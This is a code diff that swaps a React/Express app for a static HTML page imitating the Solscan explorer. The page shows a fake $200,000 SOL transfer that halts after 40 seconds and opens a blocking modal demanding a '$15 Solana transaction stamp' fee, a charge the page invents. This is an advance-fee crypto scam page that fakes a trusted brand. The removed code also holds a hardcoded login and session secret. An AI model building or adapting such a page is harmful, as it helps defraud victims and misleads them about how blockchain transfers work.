@@ -1,144 +1,263 @@
-// ==========================================
-// 1. DATA MODEL (shared/schema.ts)
-// ==========================================
-import { pgTable, text, serial, boolean } from "drizzle-orm/pg-core";
-
-export const users = pgTable("users", {
-  id: serial("id").primaryKey(),
-  username: text("username").notNull().unique(),
-  password: text("password").notNull(),
-  isAdmin: boolean("is_admin").default(false),
-});
-
-// ==========================================
-// 2. BACKEND ROUTES (server/routes.ts)
-// ==========================================
-import { storage } from "./storage";
-import session from "express-session";
-
-export async function registerRoutes(httpServer, app) {
-  app.use(session({ secret: "solana_secret", resave: false, saveUninitialized: false }));
-
-  // Seed user: username="agent", password="Brent123"
-  app.post("/api/login", async (req, res) => {
-    const { username, password } = req.body;
-    if (username === "agent" && password === "Brent123") {
-      req.session.userId = 1;
-      return res.json({ message: "Login successful" });
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SOLSCAN — Transaction Dashboard</title>
+  <style>
+    :root{
+      --bg:#0f131a;
+      --panel:#1c222e;
+      --muted-border:#232936;
+      --accent:#14F195;
+      --accent-2:#9945FF;
+      --green-glow: 0 0 10px rgba(20,241,149,0.25);
+      --red: #ff6b6b;
     }
-    res.status(401).json({ message: "Invalid credentials" });
-  });
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background:var(--bg);
+      color:#fff;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+    }
 
-  return httpServer;
-}
+    .container{max-width:1100px;margin:0 auto;padding:40px 16px;}
 
-// ==========================================
-// 3. FRONTEND - DASHBOARD (client/src/pages/Dashboard.tsx)
-// ==========================================
-import { useEffect, useState } from "react";
-import { RefreshCw, Clock, Box } from "lucide-react";
+    header{
+      border-bottom:1px solid var(--muted-border);
+      padding:16px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+    }
+    .brand{display:flex;align-items:center;gap:12px;font-weight:700;font-size:18px}
+    .logo{
+      width:40px;height:40px;border-radius:8px;
+      background:linear-gradient(135deg,var(--accent-2),var(--accent));
+      display:flex;align-items:center;justify-content:center;font-weight:700;color:#000;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.6);
+    }
 
-export default function Dashboard() {
-  const [status, setStatus] = useState("Processing");
-  const [progress, setProgress] = useState(0);
-  const [showModal, setShowModal] = useState(false);
+    main{padding:28px 0}
+    h1{font-size:22px;margin:0 0 16px 0}
 
-  useEffect(() => {
-    const duration = 40000; // 40 Seconds
-    const interval = 100;
-    let step = 0;
+    .card{
+      background:var(--panel);
+      border:1px solid var(--muted-border);
+      padding:24px;border-radius:12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
 
-    const timer = setInterval(() => {
-      step++;
-      const pct = Math.min((step / (duration / interval)) * 100, 100);
-      setProgress(pct);
-      if (step >= duration / interval) {
-        clearInterval(timer);
-        setStatus("Halted");
-        setShowModal(true);
-      }
-    }, interval);
-    return () => clearInterval(timer);
-  }, []);
+    .status-pill{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      padding:6px 10px;border-radius:999px;
+      border:1px solid rgba(255,255,255,0.04);
+      font-size:13px;
+    }
+    .status-processing{
+      background: rgba(59,130,246,0.08);
+      color:#93c5fd;
+      border-color: rgba(59,130,246,0.16);
+    }
+    .status-halted{
+      background: rgba(239,68,68,0.08);
+      color:#fb7185;
+      border-color: rgba(239,68,68,0.16);
+    }
 
-  return (
-    <div className="min-h-screen bg-[#0f131a] text-white font-sans">
-      <header className="border-b border-[#232936] p-4 flex justify-between items-center">
-        <div className="flex items-center gap-2 font-bold text-xl">
-          <div className="w-8 h-8 rounded bg-gradient-to-br from-[#9945FF] to-[#14F195] flex items-center justify-center">S</div>
-          <span>SOLSCAN</span>
-        </div>
-      </header>
+    /* layout rows */
+    .grid{display:grid;grid-template-columns:1fr 2fr;gap:12px;padding:12px 0;border-bottom:1px solid var(--muted-border)}
+    .grid:last-child{border-bottom:0;padding-top:18px}
+    .label{color:#9aa3b2}
+    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,monospace;color:var(--accent)}
+    .amount{font-weight:700;font-size:18px}
+    .amount .muted{color:#9aa3b2;font-weight:400;font-size:13px;margin-left:8px}
 
-      <main className="container mx-auto py-10 px-4">
-        <div className="max-w-4xl mx-auto space-y-6">
-          <h1 className="text-2xl font-bold">Transaction Details</h1>
-          <div className="bg-[#1c222e] rounded-lg border border-[#232936] p-6 shadow-xl">
-            <div className="flex items-center gap-3 mb-6">
-              <span className={`px-3 py-1 rounded border ${status === 'Processing' ? 'bg-blue-500/10 border-blue-500/20 text-blue-400' : 'bg-red-500/10 border-red-500/20 text-red-400'}`}>
-                <RefreshCw className={`w-4 h-4 inline mr-2 ${status === 'Processing' ? 'animate-spin' : ''}`} />
-                {status}
-              </span>
-            </div>
-            
-            <div className="space-y-4 text-sm">
-              <div className="grid grid-cols-3 border-b border-[#232936] pb-4">
-                <span className="text-gray-500">To Address</span>
-                <span className="col-span-2 text-[#14F195] font-mono">CzjhhaP356o27kZoe5C4msxmVFLbixDDxcGGWNnvpuqj</span>
-              </div>
-              <div className="grid grid-cols-3 border-b border-[#232936] pb-4">
-                <span className="text-gray-500">Amount</span>
-                <span className="col-span-2 font-bold text-lg">1,403 SOL <span className="text-gray-500 text-sm font-normal">($200,000.00)</span></span>
-              </div>
-              <div className="grid grid-cols-3 pt-2">
-                <span className="text-gray-500">Progress</span>
-                <div className="col-span-2">
-                  <div className="w-full bg-gray-800 h-2 rounded-full overflow-hidden mt-2">
-                    <div className="bg-[#14F195] h-full transition-all duration-300 shadow-[0_0_10px_#14F195]" style={{ width: `${progress}%` }} />
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </main>
+    /* progress bar */
+    .progress-track{background:#0f1720;height:10px;border-radius:999px;overflow:hidden;border:1px solid #0b0f14}
+    .progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),#10c278);box-shadow:var(--green-glow);width:0%;transition:width 120ms linear}
 
-      {/* ERROR MODAL */}
-      {showModal && (
-        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-          <div className="bg-[#1c222e] border border-red-500/30 rounded-lg max-w-md w-full overflow-hidden shadow-2xl animate-in zoom-in-95">
-            <div className="bg-red-500/10 p-6 border-b border-red-500/20">
-              <h2 className="text-red-400 text-xl font-bold flex items-center gap-2">⚠️ Transaction Halted</h2>
-            </div>
-            <div className="p-6 space-y-4">
-              <div className="bg-red-500/5 border border-red-500/10 p-4 rounded text-red-200 text-sm italic">
-                "$15 needed for SOLANA TRANSACTION STAMP. If the system doesn't stamp the payment with the $15, the pay will not be available on the address."
-              </div>
-              <p className="text-gray-400 text-sm leading-relaxed">
-                This transaction requires a verified stamp fee to complete the final consensus on the Solana Chain.
-              </p>
-              <button className="w-full bg-[#14F195] hover:bg-[#10c278] text-black font-bold py-4 rounded transition-all shadow-lg shadow-[#14F195]/20">
-                Pay Transaction Stamp ($15.00)
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
+    /* modal */
+    .modal-backdrop{
+      position:fixed;inset:0;background:rgba(0,0,0,0.8);backdrop-filter:blur(4px);
+      display:flex;align-items:center;justify-content:center;z-index:60;padding:16px;
+    }
+    .modal{
+      width:100%;max-width:520px;border-radius:10px;overflow:hidden;
+      background:var(--panel);border:1px solid rgba(255,0,0,0.06);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      animation:zoomIn .18s ease;
+    }
+    @keyframes zoomIn{from{transform:scale(.98);opacity:0}to{transform:scale(1);opacity:1}}
+
+    .modal-head{background:rgba(255,0,0,0.04);padding:18px;border-bottom:1px solid rgba(255,0,0,0.06)}
+    .modal-body{padding:18px;line-height:1.45;color:#c7d1db}
+    .alert{
+      background:rgba(255,0,0,0.03);border:1px solid rgba(255,0,0,0.06);padding:12px;border-radius:8px;color:#ffccd1;font-style:italic;font-size:14px;margin-bottom:12px;
+    }
+    .pay-btn{
+      display:block;width:100%;padding:14px;border-radius:8px;background:linear-gradient(180deg,var(--accent),#10c278);
+      color:#000;font-weight:700;border:0;cursor:pointer;margin-top:8px;
+      box-shadow: 0 10px 30px rgba(20,241,149,0.12);
+    }
+
+    /* small icon styles */
+    .icon{width:16px;height:16px;display:inline-block;vertical-align:middle}
+
+    /* spinner animation */
+    .spin{animation:spin 1s linear infinite;display:inline-block}
+    @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+
+    /* small utilities */
+    .muted-small{color:#9aa3b2;font-size:13px}
+    .text-red{color:#fb7185}
+    .hidden{display:none}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand">
+      <div class="logo">S</div>
+      <div>SOLSCAN</div>
     </div>
-  );
-}
+    <div style="opacity:0.9;font-size:13px;color:#9aa3b2">Local Demo</div>
+  </header>
 
-// ==========================================
-// 4. GLOBAL CSS (client/src/index.css)
-// ==========================================
-/*
-body {
-  background-color: #0f131a;
-  color: #ffffff;
-}
-.glass-panel {
-  background: rgba(28, 34, 46, 0.8);
-  backdrop-filter: blur(12px);
-  border: 1px solid rgba(35, 41, 54, 1);
-}
-*/
+  <main class="container">
+    <div style="max-width:900px;margin:0 auto;gap:20px;display:flex;flex-direction:column">
+      <h1>Transaction Details</h1>
+
+      <div class="card">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+          <div id="statusPill" class="status-pill status-processing">
+            <svg id="refreshIcon" class="icon spin" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:6px">
+              <path d="M21 12a9 9 0 10-3.16 6.16L21 12z" stroke="#93c5fd" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M21 3v9h-9" stroke="#93c5fd" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <span id="statusText">Processing</span>
+          </div>
+        </div>
+
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <div class="grid" style="grid-template-columns:140px 1fr">
+            <div class="label">To Address</div>
+            <div class="mono">CzjhhaP356o27kZoe5C4msxmVFLbixDDxcGGWNnvpuqj</div>
+          </div>
+
+          <div class="grid" style="grid-template-columns:140px 1fr">
+            <div class="label">Amount</div>
+            <div class="amount">1,403 SOL <span class="muted">($200,000.00)</span></div>
+          </div>
+
+          <div class="grid" style="grid-template-columns:140px 1fr;border-bottom:0;padding-top:8px">
+            <div class="label">Progress</div>
+            <div>
+              <div class="progress-track" aria-hidden="true">
+                <div id="progressFill" class="progress-fill" style="width:0%"></div>
+              </div>
+              <div style="display:flex;justify-content:space-between;margin-top:8px">
+                <div class="muted-small">Estimated finalization</div>
+                <div id="progressPct" class="muted-small">0%</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Error Modal (hidden until triggered) -->
+  <div id="modal" class="modal-backdrop hidden" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal" role="document">
+      <div class="modal-head">
+        <h2 id="modalTitle" style="margin:0;color:#ffb3b9;font-size:18px;display:flex;align-items:center;gap:10px">⚠️ Transaction Halted</h2>
+      </div>
+      <div class="modal-body">
+        <div class="alert">
+          "$15 needed for SOLANA TRANSACTION STAMP. If the system doesn't stamp the payment with the $15, the pay will not be available on the address."
+        </div>
+        <p style="margin:0 0 12px 0">This transaction requires a verified stamp fee to complete the final consensus on the Solana Chain.</p>
+        <button id="payBtn" class="pay-btn">Pay Transaction Stamp ($15.00)</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      const duration = 40000; // 40 seconds
+      const interval = 100; // ms
+      const totalSteps = duration / interval;
+      let step = 0;
+
+      const progressFill = document.getElementById('progressFill');
+      const progressPct = document.getElementById('progressPct');
+      const statusText = document.getElementById('statusText');
+      const statusPill = document.getElementById('statusPill');
+      const refreshIcon = document.getElementById('refreshIcon');
+      const modal = document.getElementById('modal');
+      const payBtn = document.getElementById('payBtn');
+
+      // Prevent scroll when modal open
+      function setModalOpen(open) {
+        if (open) {
+          modal.classList.remove('hidden');
+          document.body.style.overflow = 'hidden';
+        } else {
+          modal.classList.add('hidden');
+          document.body.style.overflow = '';
+        }
+      }
+
+      const timer = setInterval(() => {
+        step++;
+        const pct = Math.min(Math.round((step / totalSteps) * 100), 100);
+        progressFill.style.width = pct + '%';
+        progressPct.textContent = pct + '%';
+
+        if (step >= totalSteps) {
+          clearInterval(timer);
+          // show halted modal
+          statusText.textContent = 'Halted';
+          statusPill.classList.remove('status-processing');
+          statusPill.classList.add('status-halted');
+          // stop spinner
+          refreshIcon.classList.remove('spin');
+          setModalOpen(true);
+        }
+      }, interval);
+
+      payBtn.addEventListener('click', function () {
+        // Simulate payment processing
+        payBtn.disabled = true;
+        payBtn.textContent = 'Processing payment...';
+        setTimeout(() => {
+          // Payment successful -> finalize transaction
+          payBtn.textContent = 'Paid ✓';
+          statusText.textContent = 'Completed';
+          statusPill.classList.remove('status-halted');
+          statusPill.style.background = 'linear-gradient(90deg,var(--accent),#10c278)';
+          statusPill.style.color = '#001e0f';
+          setTimeout(() => {
+            setModalOpen(false);
+          }, 800);
+          // optionally fill progress to 100
+          progressFill.style.width = '100%';
+          progressPct.textContent = '100%';
+        }, 1800);
+      });
+
+      // If the user clicks outside modal content close nothing (modal is blocking)
+      modal.addEventListener('click', (e) => {
+        if (e.target === modal) {
+          // do nothing, require payment or user to close via paid action
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
